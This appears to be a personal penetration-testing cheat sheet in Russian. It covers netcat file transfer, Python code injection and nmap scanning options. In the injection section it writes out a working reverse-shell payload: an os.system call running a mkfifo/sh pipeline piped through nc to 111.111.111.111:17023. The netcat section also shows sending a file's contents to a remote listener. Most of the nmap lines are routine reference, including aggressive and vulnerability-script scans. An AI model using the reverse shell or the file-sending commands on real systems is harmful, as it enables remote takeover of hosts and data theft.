Отправка содержимого файла с удаленного хоста:
	$ nc <IP_ADDRESS> <PORT> < <FILE_NAME>.txt
		# При добавлении опции "-u" будет использоваться UDP.
		# Данную опцию неоюходимо указывать ка к на слушателе, так и на отправителе.
	
	
На стороне слушателя запускается следующая команда:
	$ nc -l -n -k <PORT> > <FILE_NAME>.txt
		# Если не указывать вывод в файл, то содержимое файла прилетит в консоль
		# Опция "-k" позволяет не закрывать соединени и продолжать прослушивать указанный порт.
		
	example:
		$ nc -lvnp 17023 file.txt
		
Python code inhection:
	__import__('os').system('')
	
	example:
		import('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 111.111.111.111 17023 >/tmp/f')

Сканирование с помощью nmap:
	$ nmap 192.168.1.234 							#Сканирование одного хоста
		# Добавление опции "-v" выводит прогресс сканирования в реальном времени
		# Добавление опции "-O" позволяет угадать ОС удаленного хоста
	$ nmap 192.168.1.0/24        					# CIDR‑нотация
	$ nmap 192.168.1.*          					# маска с *
	$ nmap 192.168.1.1-50      						# диапазон 1–50
	$ nmap -p 80,443 192.168.1.100           		# порты 80 и 443
	$ nmap -p 1-1000 192.168.1.100             		# порты с 1 по 1000
	$ nmap -p- 192.168.1.100                  		# все 65535 портов
	$ nmap -Pn 192.168.1.100 						# Сканирование без ICMP
	$ nmap -sV 192.168.1.100 						# Сканирование с определением версий и служб на порту
	$ nmap -A 192.168.1.100 						# Агрессивное сканиррование (определяет ОС удалённого хоста; сканирует версии служб; запускает скрипты NSE; делает трассировку маршрута.)
	$ nmap --top-ports 10 192.168.1.100 # Проверка распространенных портов
	$ nmap -sT 192.168.1.100 						# Сканирование только TCP‑портов
	$ nmap -sU 192.168.1.100 						# Сканирование только UDP‑портов
	$ nmap -sO 192.168.1.100 						# Сканирование с определением поддерживаемых протоколов
	$ nmap 192.168.1.0/24 --exclude 192.168.1.5,192.168.1.10 		# Исключение хостов из сканирования
	$ nmap -oN results.txt 192.168.1.100 					# Вывод результатов сканирования в файл
		# Опция "-oX results.xml" выводит результаты сканирования в файл XML
		# Jgwbz "-oG results.gnmap" выводит результаты сканирования в Grepable‑формате (одна строка на хост)
	$ nmap --scan-delay 1s 192.168.1.100     				# Сканирование с ограничением скорости: пауза 1 сек между пакетами
	$ nmap --max-rate 10 192.168.1.100         				# Сканирование с ограничением скорости: не более 10 пакетов/сек
	$ nmap --script ssh* 192.168.1.100 						# Сканирование с использованием скриптов NSE (Nmap Scripting Engine): Проверка SSH сервисов
	$ nmap --script http-vuln* 192.168.1.100 				# Сканирование с использованием скриптов NSE (Nmap Scripting Engine): Проверка на распространённые веб‑уязвимости
